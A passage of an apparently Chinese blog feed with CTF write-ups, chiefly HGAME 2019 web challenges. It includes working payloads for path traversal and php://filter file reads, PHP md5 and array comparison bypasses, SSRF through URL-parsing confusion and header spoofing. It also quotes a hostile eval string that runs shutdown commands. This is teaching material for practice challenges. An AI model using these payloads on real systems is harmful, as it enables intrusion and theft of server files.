class="number">29</span>):</span><br><span class="line">        res += chr(v5[j]^i)</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></div></figure><p>运行结果：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1a3be6535.png" alt></p>        <h2 id="Eazy-Math">          <a href="#Eazy-Math" class="heading-link"><i class="fas fa-link"></i></a>Eazy_Math</h2>      <p>同样的，还是丢进IDA中查看伪代码：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1a6c49e42.png" alt></p><p>flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。</p><p>首先查看String2Int函数：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1be73b91e.png" alt="img"></p><p>这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。</p><p>查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。</p><p>最后是Change函数：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1ab4dec43.png" alt></p><p>第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组：</p><script type="math/tex; mode=display">\begin{cases}A+2B+C=274\\2A+B+C=294\\A+B+2C=316\end{cases}</script><script type="math/tex; mode=display">\begin{cases}D+2E+F=262 \\2D+E+F=274 \\D+E+2F=252 \\\end{cases}</script><script type="math/tex; mode=display">\begin{cases}G+2H+I=380 \\2G+H+I=421 \\G+H+2I=427 \\\end{cases}</script><p>简单的方程组求得A-G的9个值转化为字符即为flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2019-Web-Week1&amp;2</title>
    <link href="http://chaosec.top/2019/01/30/hgame2019/"/>
    <id>http://chaosec.top/2019/01/30/hgame2019/</id>
    <published>2019-01-30T07:15:00.000Z</published>
    <updated>2019-02-12T05:04:28.094Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="前言">          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>      <p>寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做</p><a id="more"></a>        <h1 id="week-1">          <a href="#week-1" class="heading-link"><i class="fas fa-link"></i></a>week-1</h1>              <h2 id="谁吃了我的flag">          <a href="#谁吃了我的flag" class="heading-link"><i class="fas fa-link"></i></a>谁吃了我的flag</h2>      <p>vim文件泄露<code>.index.html.swp</code>，vim恢复即可得到flag<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></div></figure></p>        <h2 id="very-easy-web">          <a href="#very-easy-web" class="heading-link"><i class="fas fa-link"></i></a>very easy web</h2>      <p>url二次编码绕过 <code>?id=%2576%2569%2564%2561%2572</code><br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></div></figure></p>        <h2 id="换头大作战">          <a href="#换头大作战" class="heading-link"><i class="fas fa-link"></i></a>换头大作战</h2>      <p>题目要求POST传值</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot;</span><br></pre></td></tr></table></div></figure><p>得到回显</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&#x2F;&gt;https:&#x2F;&#x2F;www.wikiwand.com&#x2F;en&#x2F;X-Forwarded-For&lt;br&#x2F;&gt;only localhost can get flag</span><br></pre></td></tr></table></div></figure><p>依次按照要求设置请求头</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox&#x2F;50.0&quot; -e www.bilibili.com</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="can-u-find-me">          <a href="#can-u-find-me" class="heading-link"><i class="fas fa-link"></i></a>can u find me?</h2>      <p>查看源代码可知存在f12.php界面，在响应头中可以看到密码 <code>woyaoflag</code>，提交即会出现<code>cilck me to get flag</code>，点击则跳转到 <code>toofast.php</code>，回显<code>aoh,your speed is sososo fast,the flag must have been left in somewhere</code>，应该是出现了302跳转，抓包即可得到flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="week-2">          <a href="#week-2" class="heading-link"><i class="fas fa-link"></i></a>week-2</h1>              <h2 id="easy-php">          <a href="#easy-php" class="heading-link"><i class="fas fa-link"></i></a>easy_php</h2>      <p>探测目录发现robots.txt下存在文件<code>img/index.php</code>，访问之，得到PHP代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure><p>题目过滤了<code>../</code>，且将其转换为空字符串，所以我们可以用<code>..././</code>来绕过，本来试了 <code>..././flag</code>，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag</span><br></pre></td></tr></table></div></figure><p>base64解码即可得到flag，</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="php-trick">          <a href="#php-trick" class="heading-link"><i class="fas fa-link"></i></a>php trick</h2>      <p>代码审计</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php</span><br></pre></td></tr></table></div></figure><p>用两个@的原因可以参考这篇文章<span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/2215#toc-15" target="_blank" rel="noopener">ref</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><ul><li>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com </li><li>进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过<br>此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</li></ul><p>可以得到admin.php页面的代码</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure><p>查看代码可知存在flag.php页面，关键代码如下：<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></div></figure><p>flag.php</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt;</span><br></pre></td></tr></table></div></figure>        <h2 id="PHP-Is-The-Best-Language">          <a href="#PHP-Is-The-Best-Language" class="heading-link"><i class="fas fa-link"></i></a>PHP Is The Best Language</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>代码审计题目，核心代码在于</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是<strong>数组(Array)</strong>，由于数组是hash_hmac无法处理的输入类型，所以会返回<strong>null</strong></p><p>第二处在于<code>(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1</code></p><p>此处我们可以爆破</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">9999999999</span>;$i++)&#123;</span><br><span class="line"><span class="keyword">if</span> ((md5($i)+<span class="number">1</span>) == (md5(md5($i)))+<span class="number">1</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>结果为12</p><p>最终payload为</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">door[]&#x3D;12&amp;key&#x3D;12&amp;gate&#x3D;4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></div></figure><p>flag如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Baby-Spider">          <a href="#Baby-Spider" class="heading-link"><i class="fas fa-link"></i></a>Baby_Spider</h2>      <p>题目考察我们的爬虫能力，真的做的我胃疼</p><p>题目一共30关，40秒内答对30关的数学题即可获得flag</p><ul><li><p>1-10<br>需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda __g: [(os.system(&#39;shutdown -s -t 0&#39;), (os.system(&#39;shutdown now&#39;), None)[1])[1] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0])(globals())#-----&#x3D;?</span><br></pre></td></tr></table></div></figure><p>由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~）</p></li><li><p>11-20<br>第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">      font-family: Ariali;</span><br><span class="line">      src: url(&#39;&#x2F;static&#x2F;Ariali.otf&#39;);</span><br><span class="line">      font-weight: normal;</span><br><span class="line">      font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>下载字体<br><img src="https://i.loli.net/2019/02/11/5c614ba6c3e49.png" alt><br>可以看到数字对应规则变化了，对应置换一下即可</p></li><li><p>21-30<br>此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可</p></li></ul><p>最终paylaod如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">token = <span class="string">"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>&#125;</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://111.231.140.29:10000"</span></span><br><span class="line">url2 = <span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url3 = <span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url4=<span class="string">'http://111.231.140.29:10000/statics/style.css'</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url1,data=dict(token=token))</span><br><span class="line">cookies = res.cookies</span><br><span class="line">al_list = <span class="string">'1026943587'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># res = requests.get(url2,cookies=cookies,headers=headers)</span></span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">21</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    exp = list(exp)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(exp)):</span><br><span class="line">        <span class="keyword">if</span> ord(exp[x])&gt;<span class="number">47</span> <span class="keyword">and</span> ord(exp[x]) &lt; <span class="number">59</span>:</span><br><span class="line">            exp[x] = al_list[ord(exp[x])<span class="number">-48</span>]</span><br><span class="line">    exp = <span class="string">""</span>.join(exp)</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>,<span class="number">31</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    res = requests.get(url4,cookies=cookies,headers=headers)</span><br><span class="line">    exp = re.findall(<span class="string">r'content:"(.+)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br></pre></td></tr></table></div></figure><p>flag如下：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="Math有趣">          <a href="#Math有趣" class="heading-link"><i class="fas fa-link"></i></a>Math有趣</h2>      <p>先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻<code>img/cXVlc3Rpb24ucG5n.php</code>，base64解码之后是<code>question.png</code>，尝试了一下<code>../../../../../etc/passwd</code>(base64编码)，发现可以成功读取文件<br><img src="https://i.loli.net/2019/02/12/5c623f9854da7.png" alt="/etc/passwd"><br>接下来就是探测工作目录了，学到一个东西，可以探测<code>.bash_history</code>，该文件记录了最近的bash命令<code>../../../../../root/.bash_history</code></p><p><img src="https://i.loli.net/2019/02/12/5c6240665dab0.png" alt></p><p>工作目录为<code>/usr/local/tomcat/webapps/ROOT</code></p><p>接下来我们可以给链接加<code>=</code>诱发报错</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.tan90.me:8080&#x2F;img&#x2F;cXVlc3Rpb24ucG5n&#x3D;.php</span><br></pre></td></tr></table></div></figure><p><img src="https://i.loli.net/2019/02/12/5c6240ecc59e8.png" 